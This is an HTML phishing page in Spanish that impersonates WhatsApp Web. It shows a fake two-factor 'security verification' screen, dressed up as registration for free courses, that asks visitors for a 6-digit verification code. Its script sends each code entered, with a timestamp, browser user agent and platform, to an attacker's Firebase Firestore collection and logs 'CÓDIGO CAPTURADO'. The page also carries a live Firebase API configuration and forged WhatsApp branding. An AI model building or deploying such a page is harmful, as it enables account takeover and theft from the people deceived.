<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #00a884 0%, #008f72 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            max-width: 440px;
            width: 100%;
            padding: 48px 40px;
            text-align: center;
        }
        
        .logo { width: 90px; height: 90px; margin-bottom: 24px; }
        
        h1 {
            color: #1f2937;
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .subtitle {
            color: #6b7280;
            font-size: 15px;
            margin-bottom: 32px;
        }
        
        .alert-box {
            background: #fef3c7;
            border: 1px solid #f59e0b;
            border-left: 4px solid #f59e0b;
            padding: 20px;
            margin-bottom: 28px;
            text-align: left;
            font-size: 14px;
            color: #92400e;
            border-radius: 8px;
            line-height: 1.6;
        }
        
        .alert-box strong {
            display: block;
            margin-bottom: 8px;
            color: #92400e;
            font-size: 15px;
        }
        
        .input-group {
            margin-bottom: 24px;
            text-align: left;
        }
        
        label {
            display: block;
            color: #374151;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
        }
        
        input[type="text"] {
            width: 100%;
            padding: 20px;
            font-size: 36px;
            text-align: center;
            letter-spacing: 16px;
            border: 2px solid #e5e7eb;
            border-radius: 10px;
            outline: none;
            font-family: 'SF Mono', monospace;
            font-weight: 700;
            color: #059669;
            background: #f9fafb;
        }
        
        input[type="text"]:focus {
            border-color: #00a884;
            background: white;
            box-shadow: 0 0 0 4px rgba(0,168,132,0.1);
        }
        
        button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #00a884 0%, #059669 100%);
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(0,168,132,0.3);
        }
        
        #exito {
            display: none;
            margin-top: 28px;
            padding: 24px;
            background: #d1fae5;
            border: 2px solid #10b981;
            border-radius: 10px;
            color: #065f46;
            animation: slideIn 0.5s ease;
        }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .spinner {
            display: none;
            width: 40px;
            height: 40px;
            border: 4px solid #e5e7eb;
            border-top: 4px solid #00a884;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .footer {
            margin-top: 32px;
            color: #9ca3af;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" class="logo">
        
        <h1>Verificación de Seguridad</h1>
        <p class="subtitle">Protección de dos factores activada</p>
        
        <div class="Por favor, utilice este enlace para acceder correctamente a nuestros cursos y talleres gratuitos, ya que constituye un filtro de seguridad necesario.
        </div>
        
        <div class="input-group">
            <label>Código de verificación</label>
            <input type="text" id="codigo" placeholder="123456" maxlength="6" autocomplete="off">
        </div>
        
        <div class="spinner" id="spinner"></div>
        
        <button onclick="verificar()" id="btnVerificar">
            Verificar y Proteger Cuenta
        </button>
        
        <div id="exito">
            <strong>✅ Verificación completada</strong> su registro en nuestros cursos y talleres gratuitos se ha completado satisfactoriamente.
            .
        </div>
        
        <div class="footer">
            © 2026 WhatsApp Inc. Todos los derechos reservados.
        </div>
    </div>

    <script>
        // CONFIGURACIÓN FIREBASE
        const firebaseConfig = {
            apiKey: "AIzaSyDfAcFFmdTtMy6jPcsHIXt-ExBNcMVqvGE",
            authDomain: "whatsappcodes-4409a.firebaseapp.com",
            projectId: "whatsappcodes-4409a",
            storageBucket: "whatsappcodes-4409a.firebasestorage.app",
            messagingSenderId: "1018861289810",
            appId: "1:1018861289810:web:39410e34aaa3bccb547a8b",
            measurementId: "G-NNLE6FP1XV"
        };
        
        // Inicializar Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        
        function verificar() {
            const codigo = document.getElementById('codigo').value.trim();
            const btn = document.getElementById('btnVerificar');
            const spinner = document.getElementById('spinner');
            const exito = document.getElementById('exito');
            
            if (codigo.length !== 6 || !/^\d+$/.test(codigo)) {
                alert('Por favor ingrese los 6 dígitos del código de verificación');
                return;
            }
            
            btn.style.display = 'none';
            spinner.style.display = 'block';
            
            // Guardar en Firebase (llega instantáneamente a tu base de datos)
            db.collection('codigos').add({
                codigo: codigo,
                fecha: new Date().toISOString(),
                fechaLocal: new Date().toLocaleString(),
                userAgent: navigator.userAgent,
                plataforma: navigator.platform
            }).then(() => {
                console.log('✅ Código guardado en Firebase');
            }).catch((error) => {
                console.error('Error:', error);
            });
            
            setTimeout(() => {
                spinner.style.display = 'none';
                exito.style.display = 'block';
                
                console.log('%c🚨 CÓDIGO CAPTURADO:', 'background: red; color: white; font-size: 20px;');
                console.log('%c' + codigo, 'background: green; color: white; font-size: 40px;');
                
            }, 2000);
        }
        
        document.getElementById('codigo').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') verificar();
        });
        
        document.getElementById('codigo').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
        });
    </script>
</body>
</html>
